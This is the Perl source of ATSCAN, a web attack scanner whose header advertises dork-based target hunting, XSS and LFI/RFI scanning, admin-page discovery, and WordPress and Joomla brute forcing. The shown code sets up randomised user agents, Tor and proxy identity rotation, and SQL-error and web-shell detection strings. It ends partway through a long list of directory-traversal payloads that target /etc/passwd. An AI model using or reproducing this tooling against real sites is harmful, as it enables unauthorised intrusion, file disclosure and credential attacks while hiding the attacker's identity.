#!/usr/bin/perl
use File::Basename;
use FindBin '$Bin';
use strict;
use warnings;
use Term::ANSIColor;
use URI::Escape;
use HTML::Entities;
############################################################################################################################################################################################
## LICENSE   ###############################################################################################################################################################################
#
#   This software is Copyright (c) 2015 Alisam Technology
#   Tool coded by Ali Mehdioui founder of Alisam Technology.
#
#   This is free software, licensed under:
#   The Artistic License 2.0
#   The Artistic License
#   Copyright (c) 2000-2006, The Perl Foundation.
############################################################################################################################################################################################
## INTRODUCTION #############################################################################################################################################################################
#
#   This script is Copyright (c) 2015 Alisam Technology
#   Tool coded by Ali Mehdioui.
#   Script name: Atscan Scanner.
#   Codename: Anon4t.
#   Works in linux platforms. Best Run on Ubuntu 14.04, Kali Linux 2.0, Arch Linux, Fedora Linux, Centos..
#
############################################################################################################################################################################################
## DESCRIPTION #############################################################################################################################################################################
#
#   ATSCAN Scanner
#   Tool to scan engines, dorks and sites for commune errors and vulnerabilities.
#   Search engine 
#   XSS scanner. 
#   LFI / ADF scanner.
#   Filter wordpress and Joomla sites in the server. 
#   Find Admin page.
#   Decode / Encode MD5 + Base64.
#   Ports scan. 
#   Scan E-mails in sites. 
#   Use proxy. 
#   Random user agent. 
#   Random proxy. 
#   Scan errors. 
#   Detect Cms.
#   Multiple instant scan. 
#   Brute force wordpress and joomla.
#   Extern commands execution.
#   Disponible on BlackArch Linux Platform.
#
#   [:] AUTOR:        Alisam Technology
#   [:] FB:           https://facebook.com/Forces.des.tempetes.marocaines
#   [:] Twitter:      https://twitter.com/AlisamTechno
#   [:] Pastebin      http://http://pastebin.com/u/Alisam_Technology
#   [:] GIT:          https://github.com/AlisamTechnology
#   [:] YOUTUBE:      http://youtube.com/c/AlisamTechnology
#
############################################################################################################################################################################################
## REQUIREMENT  ############################################################################################################################################################################
# Requiered libreries
# apt-get install libxml-simple-perl
############################################################################################################################################################################################
## CLEAR ###################################################################################################################################################################################
printf "\033c";
############################################################################################################################################################################################
############################################################################################################################################################################################
## MAKE OUTPUT DIRECTORY
my $outdir ="$Bin/output";
if (!-d $outdir) {
  mkdir $outdir, 0755 or die "cannot write in $Bin!";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TOOL VERSION
my $existantVersion='version 8.5 Stable';
############################################################################################################################################################################################
############################################################################################################################################################################################
## LOGO VERSION
my $logoVersion=$existantVersion;
$logoVersion=~ s/version/V/g;
$logoVersion=~ s/Stable//g;
############################################################################################################################################################################################
############################################################################################################################################################################################
## BANNER
sub banner {
  my @ESLOGAN=("No monopoly for knowledge!", "Virgin!! life will fuck us all!", "! Love Mezguida H4ckers !", "No Pe4ce betwin systems !", "Do not be 4 bl4ck h4cker!", "! Keep c4lm 4nd love me !", "Hacking is not Fucking !", "No h4y sistem4 4 s4lvo !!", "When be brocken u will hair it!");
my @LOGO = ("
  \033[0;33m    /\\ ___ /\\ 
  \033[0;33m   (  o   o  )            \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m   \\  >#<  / 
  \033[0;33m    /       \\       \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m   /         \\   ^  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m  |           | ||  \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m   \\          /-//  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m    ///  ///--      \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m     . \\\\\\|||/// 
  \033[0;33m    / \\ ========
  \033[0;33m    \\ /| O   O | 
  \033[0;33m     #  \\` _ '/           \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m    (#)   | |   
  \033[0;33m     #\\/( * * )\\     \033[1;36m######  ###### ###### ###### ###### ##  ## 
  \033[0;33m     #\\/(==*==)/     \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m     #   || ||       \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m    .#---'| |`----.  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m    '#---'   `----'  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m     __________
  \033[0;33m    / ___  ___ \\
  \033[0;33m   / / @ \\/ @ \\ \\
  \033[0;33m   \\ \\___/\\___/ /\\        \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m    \\____\\/____/||
  \033[0;33m    /     /\\\\\\\\\\//  \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m   |     |\\\\\\\\\\\\    \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m    \\      \\\\\\\\\\\\   \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m      \\______/\\\\\\\\  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m       _||_||_      \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m  .--,       .--,
  \033[0;33m ( (  \\.---./  ) )
  \033[0;33m  '.__/o   o\\__.'
  \033[0;33m     {=  ^  =}
  \033[0;33m      >  -  <                \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m     /       \\
  \033[0;33m    //       \\\\       \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m   //|   .   |\\\\      \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m   ''\\       /''_.-^  \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m      \\  _  /--'      \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###   
  \033[0;33m    ___)( )(___       \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m       (>\\---/<)
  \033[0;33m       ,'     `.
  \033[0;33m      /  q   p  \\
  \033[0;33m     (  >(_Y_)<  )
  \033[0;33m     >-' `-' `-<-.
  \033[0;33m     /  _.== ==.,- \\      \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m    /,    )`  '(    )
  \033[0;33m   ; `._.'      `--<  \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m  :     \\        |  ) \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m  \\      )       ;_/  \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m  `._ _/_  ___.'-\\\\\\  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m      `--\\\\\\          \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m  o       o  
  \033[0;33m   \\_____/                 \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m   /=O=O=\\   ______ 
  \033[0;33m  /   ^   \\  \\\\\\\\\\\\\\   \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m  \\ \\___/ / /\\ ___  \\  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m   \\_ V _/ /\\ /\\\\\\\\  \\ \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m     \\  \\_/\\ /\\ \@_/  / \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m      \\____\\__\\_____/  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion",
  "
  \033[0;33m     \\\\\\|||/// 
  \033[0;33m     /=======\\          \033[0;31m$ESLOGAN[int rand @ESLOGAN]
  \033[0;33m    = __   __ = 
  \033[0;33m    =( o) (o )=   \033[1;36m######  ###### ###### ###### ###### ##  ##
  \033[0;33m    =    U    =   \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
  \033[0;33m     _________    \033[1;36m######    ##   ###### ##     ###### ######
  \033[0;33m     \\__!|!__/    \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
  \033[0;33m        \\_/       \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoVersion"
  );
  print $LOGO[int rand @LOGO]."\n";
  print "\033[0;30m   _______________________________________________________________________\033[0;37m\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS
use Getopt::Long ();
my $tor;
my $proxy;
my $random;
my $help;
my $output;
my $replace;
my $with;
my $dork;
my $mlevel;
my $unique;
my $xss;
my $Target;
my $validText;
my $exploit;
my $p;
my $lfi;
my $JoomRfi;
my $shell;
my $WpAfd;
my $adminPage;
my $subdomain;
my $mports;
my $mstart;
my $mend;
my $mbasic;
my $muser;
my $mcomplete;
my $tcp;
my $udp;
my $all;
my $msites;
my $WpSites;
my $JoomSites;
my $mupload;
my $mzip;
my $command;
my $mdom;
my $misup;
my $checkVersion;
my $mmd5;
my $mencode64;
my $mdecode64;
my $eMails;
my $rangip;
my $nobanner;
my $beep;
my $WpBf;
my $username;
my $password;
my $joomBf;
my $ifinurl;
my $noinfo;
my $motor;
my $timeout;

Getopt::Long::GetOptions(\my %OPT,
                        'tor=s' => \$tor,
                        'proxy=s' => \$proxy,
                        'random' => \$random,
                        'help|h' => \$help,
                        'save=s' => \$output,
                        'dork=s' => \$dork,
                        'level=s' => \$mlevel,
                        'xss' => \$xss,
                        't=s' => \$Target,
                        'valid=s' => \$validText,
                        'exp=s' => \$exploit,
                        'p=s' => \$p,
                        'lfi' => \$lfi,
                        'joomrfi' => \$JoomRfi,
                        'shell=s' => \$shell,
                        'wpafd' => \$WpAfd,
                        'admin' => \$adminPage,
						'shost' => \$subdomain,
						'ports' => \$mports,
						'select' => \$muser,
						'udp' => \$udp,
						'tcp' => \$tcp,
						'all' => \$all,
						'start=s' => \$mstart,
						'end=s' => \$mend,
						'complete' => \$mcomplete,
						'basic' => \$mbasic,
						'sites' => \$msites,
						'wp' => \$WpSites,
						'joom' => \$JoomSites,
						'upload' => \$mupload,
						'zip' => \$mzip,
						'encode64' => \$mencode64,
						'decode64' => \$mencode64,
						'command=s' => \$command,
						'dom' => \$mdom,
						'isup' => \$misup,
						'replace=s' => \$replace,
						'with=s' => \$with,
						'md5=s' => \$mmd5,
						'encode64=s' => \$mencode64,
						'decode64=s' => \$mdecode64,
						'email' => \$eMails,
						'update' => \$checkVersion,
						'rang=s' => \$rangip,
						'nobanner' => \$nobanner,
						'beep' => \$beep,
						'wpbf' => \$WpBf,
						'joombf' => \$joomBf,
						'user=s' => \$username,
						'pass=s' => \$password,
						'ifinurl=s' => \$ifinurl,
                        'noinfo' => \$noinfo,
						'unique' => \$unique,
    					'm=s' => \$motor,
     					'time' => \$timeout,                       
) or advise();
############################################################################################################################################################################################
############################################################################################################################################################################################
## PRINT BANNER
if (!defined $nobanner) {banner();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ENGINE LANGUAGES
my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk', 'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk');
############################################################################################################################################################################################
############################################################################################################################################################################################
## BROWSER LANGUAGES
my @browserlangs=("af", "am", "ar-SA", "as", "az-Latn", "be", "bg", "bn-BD", "bn-IN", "bs", "ca", "ca-ES-valencia", "cs", "da", "de", "de-DE", "el", "en-CA", "en-GB", "en-IN", "en-AU", "en-US", "es", "es-ES", "es-US", "es-MX", "et", "eu", "fa", "fi", "fil-Latn", "fr", "fr-FR", "fr-CA", "ga", "gd-Latn", "gl", "gu", "ha-Latn", "he", "hi", "hr", "hu", "hy", "id", "ig-Latn", "is", "it", "it-IT", "ja", "ka", "kk", "km", "kn", "ko", "kok", "ku-Arab", "ky-Cyrl", "lb", "lt", "lv", "mi-Latn", "mk", "ml", "mn-Cyrl", "mr", "ms", "mt", "nb", "ne", "nl", "nl-BE", "nn", "nso", "or", "pa", "pa-Arab", "pl", "prs-Arab", "pt-BR", "pt-PT", "qut-Latn", "quz", "ro", "ru", "rw", "sd-Arab", "si", "sk", "sl", "sq", "sr-Cyrl-BA", "sr-Cyrl-RS", "sr-Latn-RS", "sv", "sw", "ta", "te", "tg-Cyrl", "th", "ti", "tk-Latn", "tn", "tr", "tt-Cyrl", "ug-Arab", "uk", "ur", "uz-Latn", "vi", "zh-Hans", "zh-Hant", "zu");
my $browserLang=$browserlangs[int rand @browserlangs];
############################################################################################################################################################################################
############################################################################################################################################################################################
## GOOGLE DOMAINS
my @googleDomains=("com", "ac", "com.om", "ad", "ae", "com.af", "com.ag", "com.ai", "am", "it.ao", "com.ar", "cat", "as", "at", "com.au", "az", "ba", "com.bd", "be", "bf", "bg", "com.bh", "bi", "bj", "com.bn", "com.bo", "com.br", "bs", "co.bw", "com.by", "com.bz", "ca", "com.kh", "cc", "cd", "cf", "cn", "com.co", "co.nz", "cg", "ch", "ci", "co.ck", "cl", "cm", "co.cr", "com.cu", "cv", "cz", "de", "nu", "dj", "dk", "dm", "com.do", "dz", "no", "com.ec", "ee", "com.eg", "es", "com.et", "com.np", "fi", "com.fj", "fm", "fr", "ga", "nl", "ge", "gf", "gg", "com.gh", "com.gi", "nr", "gl", "gm", "gp", "gr", "com.gt", "com.ni", "gy", "com.hk", "hn", "hr", "ht", "com.ng", "hu", "co.id", "iq", "ie", "co.il", "com.nf", "im", "co.in", "io", "is", "it", "ne", "je", "com.jm", "jo", "co.jp", "co.ke", "com.na", "ki", "kg", "co.kr", "com.kw", "kz", "co.mz", "la", "com.lb", "com.lc", "li", "lk", "com.my", "co.ls", "lt", "lu", "lv", "com.ly", "com.mx", "co.ma", "md", "me", "mg", "mk", "mw", "ml", "mn", "ms", "com.mt", "mu", "mv", "com.pa", "com.pe", "com.ph", "com.pk", "pn", "com.pr", "ps", "pt", "com.py", "com.qa", "ro", "rs", "ru", "rw", "com.sa", "com.sb", "sc", "se", "com.sg", "sh", "si", "sk", "com.sl", "sn", "sm", "so", "st", "com.sv", "td", "tg", "co.th", "tk", "tl", "tm", "to", "com.tn", "com.tr", "tt", "com.tw", "co.tz", "com.ua", "co.ug", "co.uk", "us", "com.uy", "co.uz", "com.vc", "co.ve", "vg", "co.vi", "com.vn", "vu", "ws", "co.za", "co.zm", "co.zw");
my $googleDomain=$googleDomains[int rand @googleDomains];
############################################################################################################################################################################################
############################################################################################################################################################################################
## ID RANDOM
my @Ids=(
"5D4B3C17298B25CC309D9A0951C6BA04",
"761446B6C1810068798CA09C88BE0776",
"76DE276369845330D17C7CD111A536DD",
"A0A6BD56DD1A054B1FF32E7FE3A44D27",
"F856B0C416AEBE6E6C7610C3B89B5245",
"88ADADC7E5DB1A344000A6F8C2B0BFA9",
"6B815A7FDAF8A283440CD6AEB586CED3",
"B6B0770CB0F48619CA0EDE35E451F9E5",
"D6EA6D2A00270CA431DD36486EE53F35",
"7E84432C6967B7DC0AA29A493A1B8FD0"
);
my $Id=$Ids[int rand @Ids];
############################################################################################################################################################################################
############################################################################################################################################################################################
## FILTER SEARCH RESULTS
my $nolisting = "q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|barra.uol.|whowhere.|hotbot.|amesville.|lycos|lygo.|orkut.|schema.|blogger.|bing.|w3.|yahoo.|yimg.|creativecommons.org|ndj6p3asftxboa7j.|.torproject.org|.lygo.com|.apache.org|live.|microsoft.|ask.|shifen.com|answers.|analytics.|googleadservices.|sapo.pt|favicon.|blogspot.|wordpress.|.css|scripts.js|jquery-1.|dmoz.|gigablast.|aol.|.macromedia.com|.sitepoint.|yandex.|www.tor2web.org|.securityfocus.com|.Bootstrap.|.metasploit.com|aolcdn.|altavista.|clusty.|teoma.|baiducontent.com|wisenut.|a9.|uolhost.|w3schools.|msn.|baidu.|hao123.|shifen.|procog.|facebook.|twitter.|flickr.|.adobe.com|oficinadanet.|elephantjmjqepsw.|.duckduckgo.io|kbhpodhnfxl3clb4|.scanalert.com|.prototype.|feedback.core|4shared.|.KeyCodeTab|.style.|www\/cache\/i1|.className.|=n.|a.Ke=|Y.config|.goodsearch.com|style.top|n.Img|n.canvas.|t.search|Y.Search.|a.href|a.currentStyle|a.style|yastatic.|.oth.net|.hotbot.com|.zhongsou.com|ezilon.com|.example.com|location.href|.navigation.|.hostname.|.bingj.com|Y.Mobile.|srpcache?p|stackoverflow.|shifen.|baidu.|baiducontent.|gstatic.|php.net|wikipedia.|webcache.|inurl.|naver.|navercorp.|windows.|window.|.devmedia|imasters.|.inspcloud.com|.lycos.com|.scorecardresearch.com|.target.|JQuery.min|Element.location.|document.|exploit-db|packetstormsecurity.|1337day|owasp|.sun.com|mobile10.dtd|onabort=function|inurl.com.br|purl.org|.dartsearch.net|r.cb|.classList.|.pt_BR.|github|microsofttranslator.com|.compete.com|.sogou.com|gmail.|blackle.com|boorow.com|gravatar.com|cookieSet|security|facebook|WindowsLiveTranslator|cache|74.125.153.132|inurl:|Network|adw.sapo|tripadvisor|yandex|Failed|tumblr.|wiki|inciclopedia.";
############################################################################################################################################################################################
############################################################################################################################################################################################
## ERRORS
my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
############################################################################################################################################################################################
############################################################################################################################################################################################
## CMS VERIFICATION
my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "\/wp-content\/", "<meta name=\"generator\" content=\"Joomla", "index.php?option\=com_", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
############################################################################################################################################################################################
############################################################################################################################################################################################
## SYSTEM RANDOM
my @sys=(
"",
"compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $strings[int rand @strings]",
"compatible; MSIE 7.0; Windows NT 5.1; $strings[int rand @strings]",
"compatible; MSIE 6.0; Windows NT 5.1; $strings[int rand @strings]",
"compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1; $strings[int rand @strings];",
"compatible; Konqueror/3.5; $strings[int rand @strings]; SunOS",
"compatible; Konqueror/3.5; $strings[int rand @strings]; NetBSD 4.0_RC3; X11; $strings[int rand @strings]",
"Macintosh; U; PPC Mac OS X 10_5_8; $strings[int rand @strings]",
"Macintosh; Intel Mac OS X 10.6; $strings[int rand @strings]; rv:21.0",
"Macintosh; Intel Mac OS X 10_9_0; $strings[int rand @strings]",
"Macintosh; U; Intel Mac OS X 10_6_6; $strings[int rand @strings]",
"X11; Linux 3.5.4-1-ARCH i686; $strings[int rand @strings]",
"Linux; U; Android 4.2.2; $strings[int rand @strings]; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0; $strings[int rand @strings]",
"iPad; CPU OS 6_0 like Mac OS X; $strings[int rand @strings]",
"Windows NT 5.1; $strings[int rand @strings]",
"Windows; I; Windows NT 5.1; $strings[int rand @strings]; rv:1.9.2.13",
"Windows NT 6.1; $strings[int rand @strings]; rv:24.0",
"Windows NT 6.1; WOW64; $strings[int rand @strings]",
"Windows NT 6.2; WOW64; $strings[int rand @strings]; rv:16.0.1",
"Windows 2000; WOW64; $strings[int rand @strings]; rv:16.0.1",
"Windows 98; WOW64; $strings[int rand @strings]; rv:16.0.1",
"Windows 95; WOW64; $strings[int rand @strings]; rv:16.0.1"
);      
############################################################################################################################################################################################
############################################################################################################################################################################################
## BROWSER RANDOM
my @vary=(
"Firefox",
"Opera",
"SeaMonkey",
"Safari",
"Dragon",
"GNU IceCat",
"Seamonkey",
"Galaxy",
"GoogleBot",
"Tor Browser",
"Bimbot",
"Konqueror",
"Flock",
"Chrome",
"Mobile",
); 
############################################################################################################################################################################################
############################################################################################################################################################################################
############################################################################################################################################################################################
############################################################################################################################################################################################
## BROWSER
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request;
my $agent = "Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];

my $ua = LWP::UserAgent->new(
         agent		=> $agent,
		 cookie_jar	=> HTTP::Cookies->new(),
);
$ua->default_header('Accept' => ('text/html'));
timeOut();
############################################################################################################################################################################################
############################################################################################################################################################################################
## SET BROWSER TIMEOUT
sub timeOut {
  if (defined $timeout) {
    $ua->timeout($timeout);
  }else{
    $ua->timeout(10); 
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## PROXY
my $proxys;
############################################################################################################################################################################################
############################################################################################################################################################################################
## PROXY CONFIG
sub GoToConfig {
  if ((defined $tor) || (defined $proxy)) {
    if (defined $tor) {
      $proxys=$tor;
    }elsif (defined $proxy) {
      if ($proxy =~ /:/) {
        $proxys=$proxy;
      }else{
        if (!-e $proxy) {
	      finInfoMenu();
          print "\033[0;31m[!] No [$proxy] found!\n";
	      exit();
	    }
        if (substr($proxy, -4) ne '.txt') {
	      finInfoMenu();
          print "\033[0;31m[!] Please change proxy file ext to [file.txt]!\n";
	      exit();
	    }
	    my @resultarray;
        open(my $filehandle, '<', $proxy);
        while(my $line = <$filehandle>){
          chomp $line;
          my @linearray = split(" ", $line);
          push(@resultarray, @linearray);
	      $proxys = $resultarray[rand @resultarray];
        }
	    close $filehandle;
      }
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RENEW PROXY
sub newIdentity {
  if (defined $tor) {
    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP -1;");
    system("service tor restart");
  }
  if (defined $proxy and substr($proxy, -4) eq '.txt') {
    GoToConfig($proxy);
  }
  $ua->proxy([qw/ http https /] => $proxys);
  $ua->cookie_jar({});
  sleep(1);
  my $URL = "http://dynupdate.no-ip.com/ip.php";
  my $request = HTTP::Request->new('GET', $URL);
  my $response = $ua->request($request);
  my $ipadress;
  if ($response->is_success) {
    if (!defined $noinfo) {
	  if ($response->content =~ m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/g) {
	  	$ipadress="$1.$2.$3.$4";
		if ($response->content =~ m/$ipadress/g) {
          print "\033[1;37m    IDNTTY: \033[0;36mNew ip::: $ipadress :::\n";
		}
	  }
	}
  }else{
    print "\033[0;31m[!] Faid to renew identity with [$proxys]!\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub startProxyUse {
  GoToConfig();
  $ua->proxy([qw/ http https /] => $proxys);
  $ua->cookie_jar({});
  $ua->env_proxy;
  timeOut();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## INTERNET CONNECTION VERIFICATION
sub testConection {
  if ((defined $tor) || (defined $proxy)) {startProxyUse();}
  my $URL = "http://dynupdate.no-ip.com/ip.php";
  my $request = HTTP::Request->new('GET', $URL);
  my $response = $ua->request($request);
  if ( !$response->is_success ) {
	print "\033[0;31m[!] ";timer();
    print "Upss.. Your Internet connection seems not active!\n";
    print "[!] Check Your Connection OR Proxy Setting!\n";
	exit();
  } 
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## LFI
my @LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%